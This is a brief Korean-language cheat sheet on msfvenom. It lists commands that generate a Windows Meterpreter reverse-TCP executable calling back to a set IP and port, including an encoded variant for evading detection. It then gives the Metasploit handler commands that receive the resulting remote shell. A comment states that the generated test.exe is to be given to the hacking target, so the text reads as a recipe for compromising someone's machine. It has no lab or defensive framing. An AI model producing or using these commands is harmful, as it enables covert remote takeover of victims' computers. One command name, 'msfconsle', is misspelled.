## msfvenom 사용법
```
root로 로그인 후,
msfvenom -p windows/meterpreter/reverse_tcp --platform windows -a x86 -f exe lhost=192.168.123.112 lport=4444 -o /root/test.exe

그럼 /root/에 test.exe 파일이 생성됨. (test.exe 파일을 해킹 대상자에게 주어야함)

또는 msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -f exe -o payload.exe

```
> -p : 페이로드 옵션을 설정
> -o : 파일 경로와 파일명 지정
> -e : 인코딩 방식
> -f : 파일 확장자 설정

```
msfconsle
use multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST 192.168.123.112
set LPORT 4444

exploit -j
```
- - -
